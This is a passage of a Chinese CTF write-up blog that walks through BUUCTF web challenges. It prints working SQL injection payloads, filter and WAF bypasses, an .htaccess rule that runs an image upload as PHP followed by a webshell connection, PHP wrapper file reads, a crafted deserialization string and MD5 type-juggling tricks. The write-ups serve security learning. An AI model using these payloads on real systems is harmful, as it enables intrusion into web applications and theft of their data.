class="line">.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</span><br></pre></td></tr></table></figure><p>写一个.htaccess文件，将其他类型的文件转化成php文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;2.png&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>接着我们再上传.htaccess文件，抓包，Content-Type更改成image&#x2F;png</p><p>蚁剑连接2.png即可 路径：&#x2F;upload&#x2F;94e1b5d8a172dee319d653594cff56e6&#x2F;2.png</p><p>根目录找到flag</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420143227755.png" alt="image-20230420143227755"></p><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>有三个文件</p><p>&#x2F;flag.txt</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420143534518.png" alt="image-20230420143534518"></p><p>&#x2F;welcome.txt</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420143547654.png" alt="image-20230420143547654"></p><p>&#x2F;hints.txt</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420143640993.png" alt="image-20230420143640993"></p><p>提示flag在&#x2F;fllllllllllllag里，filehash&#x3D;md5(cookie_secret+md5(&#x2F;fllllllllllllag))</p><p>根据题目easy_tornado可推测是服务器模板注入</p><p>需要找到cookie_serect</p><p>注入查看配置文件，得到cookie_secert</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420144517901.png" alt="image-20230420144517901"></p><p>接着进行MD5加密</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?filename=/fllllllllllllag&amp;filehash=90464389fd908f5db3eb64d0f42e2048</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420144930047.png" alt="image-20230420144930047"></p><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>输入1，回显：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Array ( [0] =&gt; 1 ) </span><br></pre></td></tr></table></figure><p>输入1‘ and1&#x3D;1啥的回显Nonono</p><p>大佬直接猜出源码是：select $_POST[‘query’] || flag from Flag</p><p>当输入*,1时，此时语句为：select *,1 from Flag，1是新增一列，</p><p>*是所有。</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420145818503.png" alt="image-20230420145818503"></p><p>另一种姿势：</p><p>先查看数据库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;show databases;#</span><br></pre></td></tr></table></figure><p>查看表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;show tables;#</span><br></pre></td></tr></table></figure><p> 查看字段值，这里出问题了。过滤了好多东西</p><p>看别人的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;set sql_mode=PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure><p>set sql_mode&#x3D;PIPES_AS_CONCAT;的作用是将||的功能从 或运算（or） 改为 字符串拼接，修改之后这个 || 相当于是将select 1 和 select flag from Flag 的结果拼接在一起。</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420150432516.png" alt="image-20230420150432516"></p><h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>打开，找到信息</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420150549216.png" alt="image-20230420150549216"></p><p>看到</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420150637831.png" alt="image-20230420150637831"></p><p>点一下这个，很快闪过去了</p><p>我们抓包仔细看看</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420150851373.png" alt="image-20230420150851373"></p><p>访问它</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); <span class="comment">//报错回显</span></span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>, <span class="string">&quot;tp&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125; <span class="comment">//strstr函数搜索在另一字符串的第一次出现</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用filter协议读取flag.php，base64解密</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420151709003.png" alt="image-20230420151709003"></p><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>万能密码能进</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1#</span></span><br></pre></td></tr></table></figure><p>但不是flag</p><p>先查一下字段</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin<span class="string">&#x27; order by 3# //无报错</span></span><br><span class="line"><span class="string">admin&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span># <span class="operator">/</span><span class="operator">/</span>有报错</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420152713873.png" alt="image-20230420152713873"></p><p>联合查询</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;union select 1,2,3#</span><br></pre></td></tr></table></figure><p>回显在2，3上</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420152917362.png" alt="image-20230420152917362"></p><p>看数据库</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;union select 1,database(),3#</span></span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420152953584.png" alt="image-20230420152953584"></p><p>看表名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=&#x27;geek&#x27;#</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420153129832.png" alt="image-20230420153129832"></p><p>看字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">group_concat(column_name) from information_schema.columns where table_schema=&#x27;geek&#x27; and table_name=&#x27;l0ve1ysq1&#x27;#</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420153259465.png" alt="image-20230420153259465"></p><p>看数据</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">group_concat(id,username,password) <span class="keyword">from</span> l0ve1ysq1</span><br></pre></td></tr></table></figure><p>有flag，geekuser没有flag</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420153428473.png" alt="image-20230420153428473"></p><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="极客大挑战 2019]Http"></a>极客大挑战 2019]Http</h2><p>打开，发现信息</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420154629357.png" alt="image-20230420154629357"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">It doesn&#x27;t come from &#x27;https://Sycsecret.buuoj.cn&#x27;</span><br><span class="line">Please use &quot;Syclover&quot; browser</span><br><span class="line">No!!! you can only read this locally!!!</span><br></pre></td></tr></table></figure><p>http头：referer:<a href="https://sycsecret.buuoj.cn/">https://Sycsecret.buuoj.cn</a></p><p>User-Agent: Syclover</p><p>X-Forwarded-For:127.0.0.1</p><p>flag</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420155202935.png" alt="image-20230420155202935"></p><h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>命令查看</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420155510702.png" alt="image-20230420155510702"></p><p>再查看源代码</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420155715714.png" alt="image-20230420155715714"></p><p>蚁剑查看，在根目录看到flag</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420155620238.png" alt="image-20230420155620238"></p><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>上传2.png，</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420155902462.png" alt="image-20230420155902462"></p><p>更改后缀，发现2.phtml可以上传</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420155955895.png" alt="image-20230420155955895"></p><p>上传路径应该是&#x2F;upload&#x2F;2.phtml</p><p>读取flag<img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420160227332.png" alt="image-20230420160227332"></p><p>蚁剑连接，根目录找到flag</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420160354641.png" alt="image-20230420160354641"></p><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>上传2.png，回显上传成功，抓包看看去</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420160551695.png" alt="image-20230420160551695"></p><p>将后缀改为phtml成功上传</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420160713757.png" alt="image-20230420160713757"></p><p>查看flag</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420160950257.png" alt="image-20230420160950257"></p><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>尝试万能密码 1‘ or 1&#x3D;1#</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420161222526.png" alt="image-20230420161222526"></p><p>报错了，or没了，or应该被过滤了</p><p>绕过方式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">双写绕过，大小写绕过，||代替</span><br></pre></td></tr></table></figure><p>1’ || 1&#x3D;1#  成功进入</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420161503565.png" alt="image-20230420161503565"></p><p>查字段数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">admin<span class="string">&#x27; oorrder bbyy 3 # //无报错</span></span><br><span class="line"><span class="string">admin&#x27;</span> oorrder bbyy <span class="number">4</span> <span class="comment"># //报错了</span></span><br></pre></td></tr></table></figure><p>联合查询吧</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; ununionion selselectect 1,2,3 #</span></span><br></pre></td></tr></table></figure><p>看数据库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; ununionion selselectect 1,database(),3 #</span><br></pre></td></tr></table></figure><p>看表名</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; ununionion seselectlect 1,database(),group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=&#x27;</span>geek<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420162538553.png" alt="image-20230420162538553"></p><p>看字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#x27;b4bsql&#x27;#</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420162737699.png" alt="image-20230420162737699"></p><p>看数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; ununionion selselectect 1,database(),group_concat(id,username,passwoorrd) frfromom  b4bsql#</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420162823139.png" alt="image-20230420162823139"></p><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>他说他有一个备份的好习惯，看看<a href="http://www.zip和www.rar等/">www.zip和www.rar等</a></p><p><a href="http://www.zip有东西/">www.zip有东西</a></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420163114051.png" alt="image-20230420163114051"></p><p>查看了class.php，index.php</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420163856548.png" alt="image-20230420163856548"></p><p>有一个Name类，里面有两个私有属性，username，password，</p><p>我们需要将username&#x3D;admin，password&#x3D;100，序列化一下get方式提交</p><p>常用的内置方法：<br> __ construct()：创建对象时初始化，当一个对象创建时被调用<br> __ wakeup() 使用unserialize时触发<br> __ sleep() 使用serialize时触发<br> __ destruction()：结束时销毁对象，当一个对象销毁时被调用</p><p>看<a href="http://t.csdn.cn/dXSFs">php反序列化</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;100&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Name</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;100&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出结果：</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420164157744.png" alt="image-20230420164157744"></p><p>在反序列化字符串时，属性个数的值大于实际属性个数时，会<strong>跳过 __wakeup()函数</strong>的执行</p><p>在Name和username前面有\0前缀，这与php的序列化方式有关。但在url提交payload的时候使用\0会被当成空白符丢失。因此要讲\0替换成%00。</p><p>原来的：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:2:&#123;s:14:&quot; Name username&quot;;s:5:&quot;admin&quot;;s:14:&quot; Name password&quot;;s:3:&quot;100&quot;;&#125;</span><br></pre></td></tr></table></figure><p>更改为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420164607721.png" alt="image-20230420164607721"></p><h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>找一下源文件</p><p>在index.php.bak里面（用dirsearch扫）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;key&#x27;])) &#123;</span><br><span class="line">    $key = $_GET[&#x27;key&#x27;];</span><br><span class="line">    if(!is_numeric($key)) &#123;</span><br><span class="line">        exit(&quot;Just num!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;</span><br><span class="line">    if($key == $str) &#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo &quot;Try to find out source file!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PHP弱类型比较绕过<a href="http://t.csdn.cn/SgTWa">看他</a></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?key=123</span><br></pre></td></tr></table></figure><p><strong>flag<img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420165407197.png" alt="image-20230420165407197"></strong></p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>找到信息</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420165522754.png" alt="image-20230420165522754"></p><p>用了一个WAF确保安全</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        $str = $_GET[&#x27;num&#x27;];</span><br><span class="line">        $blacklist = [&#x27; &#x27;, &#x27;\t&#x27;, &#x27;\r&#x27;, &#x27;\n&#x27;,&#x27;\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;,&#x27;\$&#x27;,&#x27;\\&#x27;,&#x27;\^&#x27;];</span><br><span class="line">        foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">                if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123;</span><br><span class="line">                        die(&quot;what are you want to do?&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>过滤了很多字符.正常字符没办法直接使用，只能为数字。但是可以使用 ASCII码</p><p>绕过waf</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420165817333.png" alt="image-20230420165817333"></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/calc.php? num=2;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure><p>其中var_dump()用来打印；<br> scandir（）用来获扫描目录下文件；<br> chr（47）是“&#x2F;”的ASCII编码</p><p>chr()函数可以是ASCLL码变成字符，ord()函数相反</p><p>file_get_contents() 是用于将文件的内容读入到一个字符串</p><p>发现</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420170107136.png" alt="image-20230420170107136"></p><p>读取一下看看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420170248010.png" alt="image-20230420170248010"></p><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>找到信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">~~~post money and password~~~</span><br><span class="line">if (isset($_POST[&#x27;password&#x27;])) &#123;</span><br><span class="line">$password = $_POST[&#x27;password&#x27;];</span><br><span class="line">if (is_numeric($password)) &#123;</span><br><span class="line">echo &quot;password can&#x27;t be number&lt;/br&gt;&quot;;</span><br><span class="line">&#125;elseif ($password == 404) &#123;</span><br><span class="line">echo &quot;Password Right!&lt;/br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>is_numeric()函数，检测变量是否为数字或数字字符串</p><p>password不能是数字或数字字符串，并且password等于404即可</p><p>将user的值改为1，成为本校学生</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420185127185.png" alt="image-20230420185127185"></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=404%20&amp;money=1e9</span><br></pre></td></tr></table></figure><p>借助<a href="https://so.csdn.net/so/search?q=url%E7%BC%96%E7%A0%81&spm=1001.2101.3001.7020">url编码</a>中的空字符，例如%00或者%20，比如404%20，404%00。还有在404后面加字符和符号也可以，例如：404a</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420185919916.png" alt="image-20230420185919916"></p><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>进去随便输几个数，没啥反应，看看包</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420190207016.png" alt="image-20230420190207016"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure><p>md5($pass,true)的意思是对pass进行16位原始二进制格式的字符串MD5，而mysql又会把这一串16位二进制解析成十六进制从而当做十六进制编码进行解析。所以我们要找到某一个字符串，16位md5之后变成’or‘的十六进制形式。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;or&#x27;的十六进制：276f7227</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffifdyop的md5：276f722736c95d99e921722cf9ed621c</span><br></pre></td></tr></table></figure><p>输入后，跳到&#x2F;levels91.php这，查看源码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$a = $GET[&#x27;a&#x27;];</span><br><span class="line">$b = $_GET[&#x27;b&#x27;];</span><br><span class="line">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="line">    // wow, glzjin wants a girl friend.</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>科学计数法绕过</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=QNKCDZO&amp;b=s878926199a</span><br></pre></td></tr></table></figure><p>跳到&#x2F;levell14.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>MD5强类型绕过，用数组绕过</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">param1[]=1&amp;param2[]=2</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420192000070.png" alt="image-20230420192000070"></p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php  </span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$password = $_GET[&quot;password&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file);  //useless.php</span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>useless.php文件，访问一下</p><p>啥也没有</p><p>isset($text)&amp;&amp;(file_get_contents($text,’r’)&#x3D;&#x3D;&#x3D;”welcome to the zjctf” 我们需要传入一个内容为welcome to the zjctf的文件，</p><p>data协议通常是用来执行PHP代码，也可以将内容写入data协议中，然后让file_get_contents函数取读取</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data://text/plain,welcome to the zjctf</span><br></pre></td></tr></table></figure><p><strong>welcome to the zjctf</strong></p><p>filter协议读取useless.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=</span><br></pre></td></tr></table></figure><p>解码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  提示了</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td 